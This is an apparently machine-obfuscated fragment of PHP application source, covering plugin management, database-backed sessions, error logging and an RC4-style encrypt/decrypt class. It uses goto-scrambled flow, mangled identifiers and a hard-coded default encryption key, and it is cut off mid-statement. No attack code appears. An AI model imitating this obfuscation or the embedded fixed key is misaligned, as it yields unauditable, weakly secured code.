b–˜‘–ÆÔ¨; c„»Õ®î³: foreach ($fÖÉÉ†Œ¥’ as &$eÄÁ÷âÏ˜«) { $eÄÁ÷âÏ˜«[$cß±ˆƒ˜Ğ¥[391]] = $bÉ„ÂĞâãÕ[$eÄÁ÷âÏ˜«[$cß±ˆƒ˜Ğ¥[2097]]] ? $bÉ„ÂĞâãÕ[$eÄÁ÷âÏ˜«[$cß±ˆƒ˜Ğ¥[2097]]] : array(); } goto DÛêÌÃùŸ; DÛêÌÃùŸ: } protected function groupMerge($Bä¹½è‹Ûõ) { $Bä¹½è‹Ûõ = array_unique($Bä¹½è‹Ûõ); $E·Í´½®„Ò = array(); for ($FĞÁá°„£Ü = 0; $FĞÁá°„£Ü < count($Bä¹½è‹Ûõ); $FĞÁá°„£Ü++) { $CÏÛëâÏ‹æ = !1; for ($B²´´ ÂŞ¬ = 0; $B²´´ ÂŞ¬ < count($Bä¹½è‹Ûõ); $B²´´ ÂŞ¬++) { if ($FĞÁá°„£Ü == $B²´´ ÂŞ¬) { continue; } if ($this->isParentOf($Bä¹½è‹Ûõ[$B²´´ ÂŞ¬], $Bä¹½è‹Ûõ[$FĞÁá°„£Ü])) { $CÏÛëâÏ‹æ = !0; break; } } if (!$CÏÛëâÏ‹æ) { $E·Í´½®„Ò[] = $Bä¹½è‹Ûõ[$FĞÁá°„£Ü]; } } return $E·Í´½®„Ò; } protected function isParentOf($Bè¤áâ­´, $b°ÇğÓ„¾ù) { goto FµÙ¾Ê¶Õ; FµÙ¾Ê¶Õ: $EÍÆ×ÒÆ¸‹ =& $_SERVER[Î¿—”òá]; if (!$Bè¤áâ­´ || !$b°ÇğÓ„¾ù || $Bè¤áâ­´ == $b°ÇğÓ„¾ù) { return !1; } $DÜä‡ù¼‡ = $this->getInfoSimple($Bè¤áâ­´); goto eß«ÁÔóîå; F¥¢®Á‡©™: return !1; goto aå‹à‘ˆò¤; eß«ÁÔóîå: $EŒ·ªäö†ª = $this->getInfoSimple($b°ÇğÓ„¾ù); $bŒ©Ô›Ùä¾ = $DÜä‡ù¼‡[$EÍÆ×ÒÆ¸‹[459]] . $Bè¤áâ­´ . $EÍÆ×ÒÆ¸‹[47]; if (substr($EŒ·ªäö†ª[$EÍÆ×ÒÆ¸‹[459]], 0, strlen($bŒ©Ô›Ùä¾)) == $bŒ©Ô›Ùä¾) { return !0; } goto F¥¢®Á‡©™; aå‹à‘ˆò¤: } public function groupShowRoot($f¦ãğĞ×õÚ, $f«°‰¯ôƒš = false) { goto fàöÃÖ»Ìö; Bµ¤Ç„Ü¶å: $C¢÷œº±Ğâ = array($f¦ãğĞ×õÚ); if (count($c‚ÔÊøÎ…ì) == 0) { return $C¢÷œº±Ğâ; } if ($f«°‰¯ôƒš && count($c‚ÔÊøÎ…ì) == 1) { return $C¢÷œº±Ğâ; } goto d‘—³í†µ; d‘—³í†µ: if (!$e•†òç¬ÀÉ[$eØ¡™ŸŞè½[417]] || !isset($e•†òç¬ÀÉ[$eØ¡™ŸŞè½[417]][$eØ¡™ŸŞè½[2169]]) || $e•†òç¬ÀÉ[$eØ¡™ŸŞè½[417]][$eØ¡™ŸŞè½[2169]] == $eØ¡™ŸŞè½[2146]) { return $this->groupShowRoot($c‚ÔÊøÎ…ì[count($c‚ÔÊøÎ…ì) - 1], $f«°‰¯ôƒš); } if ($e•†òç¬ÀÉ[$eØ¡™ŸŞè½[417]][$eØ¡™ŸŞè½[2169]] == $eØ¡™ŸŞè½[346]) { $fèáØÆ›¹ = explode($eØ¡™ŸŞè½[47], $e•†òç¬ÀÉ[$eØ¡™ŸŞè½[417]][$eØ¡™ŸŞè½[2170]]); if ($fèáØÆ›¹) { $C¢÷œº±Ğâ = array_merge($C¢÷œº±Ğâ, $fèáØÆ›¹); } } return $C¢÷œº±Ğâ; goto F¡¢ÜÔõ§¨; fàöÃÖ»Ìö: $eØ¡™ŸŞè½ =& $_SERVER[Î¿—”òá]; $e•†òç¬ÀÉ = $this->getInfo($f¦ãğĞ×õÚ); $c‚ÔÊøÎ…ì = $this->parentLevelArray($e•†òç¬ÀÉ[$eØ¡™ŸŞè½[459]]); goto Bµ¤Ç„Ü¶å; F¡¢ÜÔõ§¨: } protected function resetParentLevel() { $E²©ˆºšê¼ =& $_SERVER[Î¿—”òá]; $b’¨ŸÖ³¦ = $E²©ˆºšê¼[2097]; $D’ËäÕ–»÷ = $this->select(); $D’ËäÕ–»÷ = array_to_keyvalue($D’ËäÕ–»÷, $b’¨ŸÖ³¦); foreach ($D’ËäÕ–»÷ as $DˆªË®ó’Ï) { goto Bºˆ‚öÅŒ; Bºˆ‚öÅŒ: $eÌ‰Ä‡™Èª = $DˆªË®ó’Ï; $FÈäÖ°İ«ƒ = array(); while ($eÌ‰Ä‡™Èª[$E²©ˆºšê¼[461]] != 0) { $FÈäÖ°İ«ƒ[] = $eÌ‰Ä‡™Èª[$E²©ˆºšê¼[461]]; $eÌ‰Ä‡™Èª = $D’ËäÕ–»÷[$eÌ‰Ä‡™Èª[$E²©ˆºšê¼[461]]]; } goto C—ÓŠóïİÀ; AÜµµ»‘¦Ó: $this->where(array($b’¨ŸÖ³¦ => $DˆªË®ó’Ï[$b’¨ŸÖ³¦]))->save(array($E²©ˆºšê¼[525] => $FÈäÖ°İ«ƒ)); goto EæòË˜¦´£; C—ÓŠóïİÀ: $FÈäÖ°İ«ƒ[] = 0; $FÈäÖ°İ«ƒ = $E²©ˆºšê¼[47] . implode($E²©ˆºšê¼[47], array_reverse($FÈäÖ°İ«ƒ)) . $E²©ˆºšê¼[47]; $this->setNamePinyin($DˆªË®ó’Ï[$b’¨ŸÖ³¦], $DˆªË®ó’Ï[$E²©ˆºšê¼[28]]); goto AÜµµ»‘¦Ó; EæòË˜¦´£: } return $D’ËäÕ–»÷; } public function groupNameAuto($bŠàÁù÷Ï, $c‰¤‡´Øé½) { $d“¹‰‰ĞÚÌ =& $_SERVER[Î¿—”òá]; $C÷®ªîµˆ = $this->where(array($d“¹‰‰ĞÚÌ[368] => $bŠàÁù÷Ï))->getField($d“¹‰‰ĞÚÌ[28], !0); if (!$C÷®ªîµˆ || !in_array($c‰¤‡´Øé½, $C÷®ªîµˆ)) { return $c‰¤‡´Øé½; } for ($EßİÛŞìëĞ = 1; $EßİÛŞìëĞ <= count($C÷®ªîµˆ) + 1; $EßİÛŞìëĞ++) { $dĞ¿ÖåÓ = $c‰¤‡´Øé½ . "\50{$EßİÛŞìëĞ}\51"; if (!in_array($dĞ¿ÖåÓ, $C÷®ªîµˆ)) { return $dĞ¿ÖåÓ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x70\154\x75\147\151\156\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x73\x74\x61\164\x75\163", "\x72\145\147\x69\145\163\164", "\143\x6f\156\146\x69\147"); public function loadList($BœÙ‹ÄÁƒ = false) { $a»çÑ±¯˜ = array_to_keyvalue($this->listData(), $_SERVER[Î¿—”òá][28]); if ($BœÙ‹ÄÁƒ) { return $a»çÑ±¯˜[$BœÙ‹ÄÁƒ]; } return $a»çÑ±¯˜; } public function init() { $c†•âÔ•ŸÈ =& $_SERVER[Î¿—”òá]; Hook::trigger($c†•âÔ•ŸÈ[2188]); $BÒ ‡‡– Œ = $this->loadPluginList(); foreach ($BÒ ‡‡– Œ as $CÛˆ‡–áŠ => $A…ËåôÅ¦¬) { $DëÙá”³´Ü = $this->appAllow($CÛˆ‡–áŠ, $A…ËåôÅ¦¬); if (!$DëÙá”³´Ü) { continue; } foreach ($A…ËåôÅ¦¬[$c†•âÔ•ŸÈ[2189]] as $A´š’¦†‡ => $c’„Õñù³ƒ) { Hook::bind($A´š’¦†‡, $c’„Õñù³ƒ); } } Hook::trigger($c†•âÔ•ŸÈ[2190]); Hook::trigger(ACTION); } public function appAllow($F’æøë‰Ë, $bÙÙÕ­òƒæ, $f”ñ»æÓÂí = true) { $AÎ°ÚÒ«¹ =& $_SERVER[Î¿—”òá]; $fÑ†–ÔËá½ = PLUGIN_DIR . $F’æøë‰Ë . $AÎ°ÚÒ«¹[2191]; if (!is_array($bÙÙÕ­òƒæ) || !is_array($bÙÙÕ­òƒæ[$AÎ°ÚÒ«¹[2189]]) || !is_file($fÑ†–ÔËá½) || $bÙÙÕ­òƒæ[$AÎ°ÚÒ«¹[685]] != 1) { return !1; } if ($f”ñ»æÓÂí && !Action($AÎ°ÚÒ«¹[2192])->checkAuth($F’æøë‰Ë)) { return !1; } return !0; } public function unInstall($f…Ò¸ÇÛ²) { $e‘—ôšäõ‡ =& $_SERVER[Î¿—”òá]; $C“…İìÙ„‹ = $this->loadList($f…Ò¸ÇÛ²); if (file_exists(PLUGIN_DIR . $f…Ò¸ÇÛ²)) { Hook::apply($f…Ò¸ÇÛ² . $e‘—ôšäõ‡[2193]); } $this->remove($C“…İìÙ„‹[$e‘—ôšäõ‡[367]]); } public function changeStatus($Aó‹Å¾ïŠ, $f·ñòÉ†ğß) { $FÁÇ…§¹éˆ =& $_SERVER[Î¿—”òá]; $cåëç¨ğÕ = $this->loadList($Aó‹Å¾ïŠ); if ($f·ñòÉ†ğß) { Hook::apply($Aó‹Å¾ïŠ . $FÁÇ…§¹éˆ[2194]); } $this->update($cåëç¨ğÕ[$FÁÇ…§¹éˆ[367]], array($FÁÇ…§¹éˆ[2195] => $f·ñòÉ†ğß)); } public function appRegist($Cº²«‡–¦, $cÎŞ–‰á½˜) { $dŒ…å‘ÄÙ =& $_SERVER[Î¿—”òá]; $Déô‚„­ÖÔ = $this->loadList($Cº²«‡–¦); if ($Déô‚„­ÖÔ) { $this->update($Déô‚„­ÖÔ[$dŒ…å‘ÄÙ[367]], array($dŒ…å‘ÄÙ[2189] => $cÎŞ–‰á½˜)); } else { $b¾‹ˆ”×Æ¶ = array($dŒ…å‘ÄÙ[28] => $Cº²«‡–¦, $dŒ…å‘ÄÙ[2189] => $cÎŞ–‰á½˜, $dŒ…å‘ÄÙ[685] => 0, $dŒ…å‘ÄÙ[6] => $this->getConfigDefault($Cº²«‡–¦)); $this->insert($b¾‹ˆ”×Æ¶); } } public function getConfigDefault($CÅÖ—¥¿Š‘) { $fíÜñŠ†¼ =& $_SERVER[Î¿—”òá]; $b¸‘—Ÿğ›ˆ = array(); $aªô™Ñ­ê = $this->getPackageJson($CÅÖ—¥¿Š‘); if (!$aªô™Ñ­ê && is_array($aªô™Ñ­ê[$fíÜñŠ†¼[2196]])) { return $b¸‘—Ÿğ›ˆ; } foreach ($aªô™Ñ­ê[$fíÜñŠ†¼[2196]] as $Aæ‰—£Ñ¡ => $BäÚâÉëÈ) { if (!isset($BäÚâÉëÈ[$fíÜñŠ†¼[359]]) || isset($b¸‘—Ÿğ›ˆ[$Aæ‰—£Ñ¡])) { continue; } $b¸‘—Ÿğ›ˆ[$Aæ‰—£Ñ¡] = $BäÚâÉëÈ[$fíÜñŠ†¼[359]]; } return $b¸‘—Ÿğ›ˆ; } public function getPackageJson($a»ÂŠ—‰á¿) { return Hook::apply($a»ÂŠ—‰á¿ . $_SERVER[Î¿—”òá][2197]); } public function getConfig($cÕÎ«ßâ¡, $C¬áŠã‘Á¯ = false) { $Dª‡ºçÄ¡‚ =& $_SERVER[Î¿—”òá]; $a—öÇ¥Ëäµ = array(); $d‚´Ë© = $this->loadList($cÕÎ«ßâ¡); if ($d‚´Ë© && is_array($d‚´Ë©[$Dª‡ºçÄ¡‚[6]])) { $a—öÇ¥Ëäµ = $d‚´Ë©[$Dª‡ºçÄ¡‚[6]]; } if (!$a—öÇ¥Ëäµ || $C¬áŠã‘Á¯) { $a—öÇ¥Ëäµ = $this->getConfigDefault($cÕÎ«ßâ¡); } return $a—öÇ¥Ëäµ; } public function setConfig($có›¼®ØƒÊ, $cÄè¦¸„ƒ = false) { goto fŠóğ§‘Û; cÈò”¥Ãñ: $Cö¿½İ»ì = $Bƒ„Ğˆâ«¯[$bŠë‘åÅ¹ì[6]]; if ($cÄè¦¸„ƒ == !1) { $Cö¿½İ»ì = array(); $cÄè¦¸„ƒ = $this->getConfigDefault($có›¼®ØƒÊ); } foreach ($cÄè¦¸„ƒ as $DÈ…ÇÜÆù => $BŸ×Ş»ìê³) { $Cö¿½İ»ì[$DÈ…ÇÜÆù] = is_string($BŸ×Ş»ìê³) ? trim($BŸ×Ş»ìê³) : $BŸ×Ş»ìê³; } goto Fö²“ˆ¡“†; fŠóğ§‘Û: $bŠë‘åÅ¹ì =& $_SERVER[Î¿—”òá]; $Bƒ„Ğˆâ«¯ = $this->loadList($có›¼®ØƒÊ); if (!$Bƒ„Ğˆâ«¯) { return !1; } goto cÈò”¥Ãñ; Fö²“ˆ¡“†: $this->update($Bƒ„Ğˆâ«¯[$bŠë‘åÅ¹ì[367]], array($bŠë‘åÅ¹ì[6] => $Cö¿½İ»ì)); goto Bñ•Õ·Ğî ; Bñ•Õ·Ğî : } public function viewList() { goto bŞƒ…°ÒœÎ; E´–•¤øò¨: return $D²ˆƒƒ…Ÿ„; goto cÒõäğÂÊ; Bœåáœ´Õä: $EĞÕ÷¨áÉ = $this->loadPluginList(); $D²ˆƒƒ…Ÿ„ = array(); foreach ($EĞÕ÷¨áÉ as $e†²ÚßÁÇ™ => $eÖ–½Àæ½‡) { unset($eÖ–½Àæ½‡[$fØ–¶ˆñ†Æ[2189]], $eÖ–½Àæ½‡[$fØ–¶ˆñ†Æ[6]]); $c•ªôãñìß = PLUGIN_DIR . $eÖ–½Àæ½‡[$fØ–¶ˆñ†Æ[28]] . $fØ–¶ˆñ†Æ[2191]; if (!is_file($c•ªôãñìß)) { continue; } $b‚§ù·´·É = Hook::apply($eÖ–½Àæ½‡[$fØ–¶ˆñ†Æ[28]] . $fØ–¶ˆñ†Æ[2197]); if (is_array($b‚§ù·´·É)) { $D²ˆƒƒ…Ÿ„[$e†²ÚßÁÇ™] = array_merge($eÖ–½Àæ½‡, $b‚§ù·´·É); } } goto E´–•¤øò¨; bŞƒ…°ÒœÎ: $fØ–¶ˆñ†Æ =& $_SERVER[Î¿—”òá]; $EĞÕ÷¨áÉ = $this->loadList(); $this->pluginScan($EĞÕ÷¨áÉ); goto Bœåáœ´Õä; cÒõäğÂÊ: } private function loadPluginList() { $f»Í®‰Ëº =& $_SERVER[Î¿—”òá]; $BÇÁõØ = $this->loadList(); if (strtolower(MOD) == $f»Í®‰Ëº[2198]) { return $BÇÁõØ; } $dÄäóí¿â = Hook::trigger($f»Í®‰Ëº[2199], $BÇÁõØ); if ($BÇÁõØ && !$dÄäóí¿â) { die; } return $dÄäóí¿â ? $dÄäóí¿â : $BÇÁõØ; } private function pluginScan($FœÎÅĞé•à) { $A¦Œ¡³Æ® =& $_SERVER[Î¿—”òá]; recursion_dir(PLUGIN_DIR, $CùÛÁŞ¹ù¯, $dî‹˜à‹šŸ, 0); foreach ($CùÛÁŞ¹ù¯ as $b“—™øŠ“À) { $E·“ÁÕ§×¬ = get_path_this($b“—™øŠ“À); if (isset($FœÎÅĞé•à[$E·“ÁÕ§×¬]) || !file_exists($b“—™øŠ“À . $A¦Œ¡³Æ®[2200]) || !file_exists($b“—™øŠ“À . $A¦Œ¡³Æ®[2191])) { continue; } Hook::apply($E·“ÁÕ§×¬ . $A¦Œ¡³Æ®[2194]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\137\x73\x65\x73\163\151\157\x6e"; public function get($f±Ó§Ê²•) { $eàÚ–§øå† =& $_SERVER[Î¿—”òá]; $dİ‹ô¨×ğ = $this->where(array($eàÚ–§øå†[2201] => $f±Ó§Ê²•))->find(); if (!is_array($dİ‹ô¨×ğ)) { return !1; } return $dİ‹ô¨×ğ[$eàÚ–§øå†[688]]; } public function set($cÜÇš¦¿ˆó, $Dó«ƒÌÊà’, $fÅÊÂ•»Õ = 3600) { $c–˜ˆã±»¶ =& $_SERVER[Î¿—”òá]; $dÁ‰ßÏÙÂ = array($c–˜ˆã±»¶[2201] => $cÜÇš¦¿ˆó, $c–˜ˆã±»¶[2127] => $Dó«ƒÌÊà’, $c–˜ˆã±»¶[2202] => $fÅÊÂ•»Õ + time()); if (Session::get($c–˜ˆã±»¶[2203])) { $dÁ‰ßÏÙÂ[$c–˜ˆã±»¶[1429]] = Session::get($c–˜ˆã±»¶[2203]); } else { $dÁ‰ßÏÙÂ[$c–˜ˆã±»¶[1429]] = 0; } if ($this->get($cÜÇš¦¿ˆó)) { return $this->where(array($c–˜ˆã±»¶[2201] => $cÜÇš¦¿ˆó))->save($dÁ‰ßÏÙÂ); } else { return $this->add($dÁ‰ßÏÙÂ, array(), !0); } } public function remove($bí¾š‰÷·) { return $this->where(array($_SERVER[Î¿—”òá][2201] => $bí¾š‰÷·))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Î¿—”òá][2204] . time())->delete(); } } goto ašœ¥ºĞ¬¼; eÄ¡¾á¶Ó: function beforeShutdownError($eå¼¶—šŠ = false, $f¦ƒŞÖâô = '', $BÚ¤òå‰ = '', $Bö«°ºÓÁò = 0) { $c©†ôÔÌğ =& $_SERVER[‡•˜°©ˆ]; switch ($eå¼¶—šŠ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $Fêè‹²»…Û = $c©†ôÔÌğ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $Fêè‹²»…Û = $c©†ôÔÌğ[40]; break; case E_STRICT: $Fêè‹²»…Û = $c©†ôÔÌğ[41]; break; case E_NOTICE: case E_USER_NOTICE: $Fêè‹²»…Û = $c©†ôÔÌğ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $Fêè‹²»…Û = $c©†ôÔÌğ[43]; break; default: break; } if (!$Fêè‹²»…Û || $Fêè‹²»…Û == $c©†ôÔÌğ[42] || $Fêè‹²»…Û == $c©†ôÔÌğ[43]) { return; } $BÚ¤òå‰ = $c©†ôÔÌğ[4] . str_replace($_SERVER[$c©†ôÔÌğ[37]], $c©†ôÔÌğ[20], $BÚ¤òå‰); $CÆê‰²‹Ò¼ = $Fêè‹²»…Û . $c©†ôÔÌğ[44] . $f¦ƒŞÖâô . $c©†ôÔÌğ[44] . $BÚ¤òå‰ . $c©†ôÔÌğ[44] . $Bö«°ºÓÁò; write_log($CÆê‰²‹Ò¼ . $c©†ôÔÌğ[18] . get_caller_msg(1), $c©†ôÔÌğ[19]); } $_SERVER[$_SERVER[‡•˜°©ˆ][45]] = $_SERVER[$_SERVER[‡•˜°©ˆ][37]] . $_SERVER[‡•˜°©ˆ][46]; $c²Ü•ŠøÔ“ = strrev(base64_decode($_SERVER[‡•˜°©ˆ][47])); goto B¶¼†¦åùŠ; Bµ‹‰à‹±‡: define($_SERVER[Î¿—”òá][227], 2); define($_SERVER[Î¿—”òá][228], 3); define($_SERVER[Î¿—”òá][229], 1); goto bê„éĞÄğ; a·é‰Çš: class Mcrypt { public static $defaultKey = "\141\41\x74\141\153\x41\x3a\x64\x6c\155\143\154\x64\105\x76\x2c\x65"; public static function encode($E¥Ö¸É—òˆ, $Eö†ê©ˆÜ = '', $fëÉãÑÓà = 0, $Aâ÷ô–‰é = '') { goto a®Ø½°Š; aôÎ†ŠÏ˜Ô: $Dƒ™…ö¹³ù = str_replace(array($BôÒ÷Î‡³[284], $BôÒ÷Î‡³[8], $BôÒ÷Î‡³[900]), array($BôÒ÷Î‡³[412], $BôÒ÷Î‡³[70], $BôÒ÷Î‡³[91]), $Dƒ™…ö¹³ù); return $Dƒ™…ö¹³ù; goto AÅ—åŸ£ˆñ; dù‘…²ªƒİ: $Dƒ™…ö¹³ù = $BôÒ÷Î‡³[33]; for ($AÊ·ÅÊø»Å = $Cô¥ªÃ«ñÄ = $d¡«ô¸İ¥ = 0; $d¡«ô¸İ¥ < $aŒÚÂƒâ”; $d¡«ô¸İ¥++) { $AÊ·ÅÊø»Å = ($AÊ·ÅÊø»Å + 1) % 256; $Cô¥ªÃ«ñÄ = ($Cô¥ªÃ«ñÄ + $c¾ÀÊ†îÄ•[$AÊ·ÅÊø»Å]) % 256; $c÷Í½‡»¡ô = $c¾ÀÊ†îÄ•[$AÊ·ÅÊø»Å]; $c¾ÀÊ†îÄ•[$AÊ·ÅÊø»Å] = $c¾ÀÊ†îÄ•[$Cô¥ªÃ«ñÄ]; $c¾ÀÊ†îÄ•[$Cô¥ªÃ«ñÄ] = $c÷Í½‡»¡ô; $Dƒ™…ö¹³ù .= chr(ord($E¥Ö¸É—òˆ[$d¡«ô¸İ¥]) ^ $c¾ÀÊ†îÄ•[($c¾ÀÊ†îÄ•[$AÊ·ÅÊø»Å] + $c¾ÀÊ†îÄ•[$Cô¥ªÃ«ñÄ]) % 256]); } $Dƒ™…ö¹³ù = $fÜÁàˆ²‚ . str_replace($BôÒ÷Î‡³[900], $BôÒ÷Î‡³[33], base64_encode($Dƒ™…ö¹³ù)); goto aôÎ†ŠÏ˜Ô; AÆŸ‰£†È½: $cÔ­‹©Èğø = md5(substr($Eö†ê©ˆÜ, 0, 16)); $d¡Â•»‚ŒÙ = md5(substr($Eö†ê©ˆÜ, 16, 16)); $Aâ÷ô–‰é = $Aâ÷ô–‰é ? $Aâ÷ô–‰é : md5(microtime()); goto Aô—ùÆÀ‘; a®Ø½°Š: $BôÒ÷Î‡³ =& $_SERVER[Î¿—”òá]; $CŠó“²ˆ³ß = 4; $Eö†ê©ˆÜ = md5($Eö†ê©ˆÜ ? $Eö†ê©ˆÜ : self::$defaultKey); goto AÆŸ‰£†È½; eëĞ´©Í÷…: $E¥Ö¸É—òˆ = sprintf($BôÒ÷Î‡³[1923], $fëÉãÑÓà ? $fëÉãÑÓà + time() : 0) . substr(md5($E¥Ö¸É—òˆ . $d¡Â•»‚ŒÙ), 0, 16) . $E¥Ö¸É—òˆ; $aŒÚÂƒâ” = strlen($E¥Ö¸É—òˆ); $DÔ“±ˆó = array(); goto CğÛ½—¥•…; Aô—ùÆÀ‘: $fÜÁàˆ²‚ = substr($Aâ÷ô–‰é, -$CŠó“²ˆ³ß); $D’›«ˆ = $cÔ­‹©Èğø . md5($cÔ­‹©Èğø . $fÜÁàˆ²‚); $a‰âÆÖ¼£¢ = strlen($D’›«ˆ); goto eëĞ´©Í÷…; CğÛ½—¥•…: for ($d¡«ô¸İ¥ = 0; $d¡«ô¸İ¥ <= 255; $d¡«ô¸İ¥++) { $DÔ“±ˆó[$d¡«ô¸İ¥] = ord($D’›«ˆ[$d¡«ô¸İ¥ % $a‰âÆÖ¼£¢]); } $c¾ÀÊ†îÄ• = range(0, 255); for ($Cô¥ªÃ«ñÄ = $d¡«ô¸İ¥ = 0; $d¡«ô¸İ¥ < 256; $d¡«ô¸İ¥++) { $Cô¥ªÃ«ñÄ = ($Cô¥ªÃ«ñÄ + $c¾ÀÊ†îÄ•[$d¡«ô¸İ¥] + $DÔ“±ˆó[$d¡«ô¸İ¥]) % 256; $c÷Í½‡»¡ô = $c¾ÀÊ†îÄ•[$d¡«ô¸İ¥]; $c¾ÀÊ†îÄ•[$d¡«ô¸İ¥] = $c¾ÀÊ†îÄ•[$Cô¥ªÃ«ñÄ]; $c¾ÀÊ†îÄ•[$Cô¥ªÃ«ñÄ] = $c÷Í½‡»¡ô; } goto dù‘…²ªƒİ; AÅ—åŸ£ˆñ: } public static function decode($FèÊ›œ‰·Í, $f‰Æ¨ÈŠ‘ = '') { goto a—ç‰àç÷; d²ğìß‘¬: $FèÊ›œ‰·Í = base64_decode(substr($FèÊ›œ‰·Í, $d„Ö”µÇîÈ)); $DÒË½±‡Âø = strlen($FèÊ›œ‰·Í); $bÔôÆÁÉƒ„ = array(); goto b§ÂÙ…ÖéÑ; a—ç‰àç÷: $cÏÙÃØêÓ =& $_SERVER[Î¿—”òá]; $FèÊ›œ‰·Í = str_replace(array($cÏÙÃØêÓ[412], $cÏÙÃØêÓ[70], $cÏÙÃØêÓ[91]), array($cÏÙÃØêÓ[284], $cÏÙÃØêÓ[8], $cÏÙÃØêÓ[900]), $FèÊ›œ‰·Í); $d„Ö”µÇîÈ = 4; goto F¡ĞÕÚâïÓ; F¡ĞÕÚâïÓ: $f‰Æ¨ÈŠ‘ = md5($f‰Æ¨ÈŠ‘ ? $f‰Æ¨ÈŠ‘ : self::$defaultKey); $c±‘Î¤Œø¾ = md5(substr($f‰Æ¨ÈŠ‘, 0, 16)); $cÎ‡š¡äá = md5(substr($f‰Æ¨ÈŠ‘, 16, 16)); goto Fƒà“†‰”Ÿ; Eñ¢®º‹“Œ: $FŒ˜ŒÌñ‡ = $cÏÙÃØêÓ[33]; for ($e­Á“óšÑ = $bÙ‘ÈÕÃÙŠ = $B¹ùİš”Íâ = 0; $B¹ùİš”Íâ < $DÒË½±‡Âø; $B¹ùİš”Íâ++) { $e­Á“óšÑ = ($e­Á“óšÑ + 1) % 256; $bÙ‘ÈÕÃÙŠ = ($bÙ‘ÈÕÃÙŠ + $DÓ¤Ç²‰¢[$e­Á“óšÑ]) % 256; $eöª¤Ş’¯¼ = $DÓ¤Ç²‰¢[$e­Á“óšÑ]; $DÓ¤Ç²‰¢[$e­Á“óšÑ] = $DÓ¤Ç²‰¢[$bÙ‘ÈÕÃÙŠ]; $DÓ¤Ç²‰¢[$bÙ‘ÈÕÃÙŠ] = $eöª¤Ş’¯¼; $FŒ˜ŒÌñ‡ .= chr(ord($FèÊ›œ‰·Í[$B¹ùİš”Íâ]) ^ $DÓ¤Ç²‰¢[($DÓ¤Ç²‰¢[$e­Á“óšÑ] + $DÓ¤Ç²‰¢[$bÙ‘ÈÕÃÙŠ]) % 256]); } $eôˆ•Œé“Ê = intval(substr($FŒ˜ŒÌñ‡, 0, 10)); goto F®¾³ »™È; Fƒà“†‰”Ÿ: $eˆñğÂº = substr($FèÊ›œ‰·Í, 0, $d„Ö”µÇîÈ); $dƒŞğ¯çéè = $c±‘Î¤Œø¾ . md5($c±‘Î¤Œø¾ . $eˆñğÂº); $C²ß§Ï¥÷ = strlen($dƒŞğ¯çéè); goto d²ğìß‘¬; F®¾³ »™È: if (($eôˆ•Œé“Ê == 0 || $eôˆ•Œé“Ê - time() > 0) && substr($FŒ˜ŒÌñ‡, 10, 16) == substr(md5(substr($FŒ˜ŒÌñ‡, 26) . $cÎ‡š¡äá), 0, 16)) { return substr($FŒ˜ŒÌñ‡, 26); } else { return $cÏÙÃØêÓ[33]; } goto dìÖ ƒ‘©ß; b§ÂÙ…ÖéÑ: for ($B¹ùİš”Íâ = 0; $B¹ùİš”Íâ <= 255; $B¹ùİš”Íâ++) { $bÔôÆÁÉƒ„[$B¹ùİš”Íâ] = ord($dƒŞğ¯çéè[$B¹ùİš”Íâ % $C²ß§Ï¥÷]); } $DÓ¤Ç²‰¢ = range(0, 255); for ($bÙ‘ÈÕÃÙŠ = $B¹ùİš”Íâ = 0; $B¹ùİš”Íâ < 256; $B¹ùİš”Íâ++) { $bÙ‘ÈÕÃÙŠ = ($bÙ‘ÈÕÃÙŠ + $DÓ¤Ç²‰¢[$B¹ùİš”Íâ] + $bÔôÆÁÉƒ„[$B¹ùİš”Íâ]) % 256; $eöª¤Ş’¯¼ = $DÓ¤Ç²‰¢[$B¹ùİš”Íâ]; $DÓ¤Ç²‰¢[$B¹ùİš”Íâ] = $DÓ¤Ç²‰¢[$bÙ‘ÈÕÃÙŠ]; $DÓ¤Ç²‰¢[$bÙ‘ÈÕÃÙŠ] = $eöª¤Ş’¯¼; } goto Eñ¢®º‹“Œ; dìÖ ƒ‘©ß: } } define($_SERVER[Î¿—”òá][1924], 1); define($_SERVER[Î¿—”òá][1925], 2); goto cÎ¿»•õ‘; B˜¡ô¶…›ä: function Action($Dœƒ¼ÄÉÍ = '') { goto dŞöÓ¦¸¼; FÅ²¯çƒÄ‘: if (isset($EÂ³©ëŒÑ[$b†«í‰Š])) { return $EÂ³©ëŒÑ[$b†«í‰Š]; } $Dœƒ¼ÄÉÍ = trim(str_replace($C«ÊÇÙ´ìß[4], $C«ÊÇÙ´ìß[5], $Dœƒ¼ÄÉÍ), $C«ÊÇÙ´ìß[4]); $F¥íëğÇ¢‘ = explode($C«ÊÇÙ´ìß[5], $Dœƒ¼ÄÉÍ); goto f‡Ş½°´; c´ğó®ğÊ: $EÂ³©ëŒÑ[$AÌ•ã˜] = new $FéßÄÃ¹ì(); $EÂ³©ëŒÑ[$b†«í‰Š] = $EÂ³©ëŒÑ[$AÌ•ã˜]; return $EÂ³©ëŒÑ[$AÌ•ã˜]; goto B–¿¯åÏŠ; dŞöÓ¦¸¼: $C«ÊÇÙ´ìß =& $_SERVER[‡•˜°©ˆ]; static $EÂ³©ëŒÑ = array(); $b†«í‰Š = $Dœƒ¼ÄÉÍ; goto FÅ²¯çƒÄ‘; BÑ·î²Â¥: if (isset($EÂ³©ëŒÑ[$AÌ•ã˜])) { return $EÂ³©ëŒÑ[$AÌ•ã˜]; } if (is_file($bÖƒ‚…ˆ…¶)) { include_once $bÖƒ‚…ˆ…¶; } if (!class_exists($FéßÄÃ¹ì)) { return actionCallError("\133{$Dœƒ¼ÄÉÍ}\x20\x3d\x3e\x20{$FéßÄÃ¹ì}\135\x20\x63\154\x61\x73\163\x20\156\x6f\x74\x20\x65\x78\151\163\x74\163\41"); } goto c´ğó®ğÊ; f‡Ş½°´: $C¦ˆ¹‹Òù¸ = strtolower($F¥íëğÇ¢‘[0]); if (substr($C¦ˆ¹‹Òù¸, -6) == $C«ÊÇÙ´ìß[6]) { $Dœƒ¼ÄÉÍ = substr($F¥íëğÇ¢‘[0], 0, -6); $FéßÄÃ¹ì = $Dœƒ¼ÄÉÍ . $C«ÊÇÙ´ìß[7]; 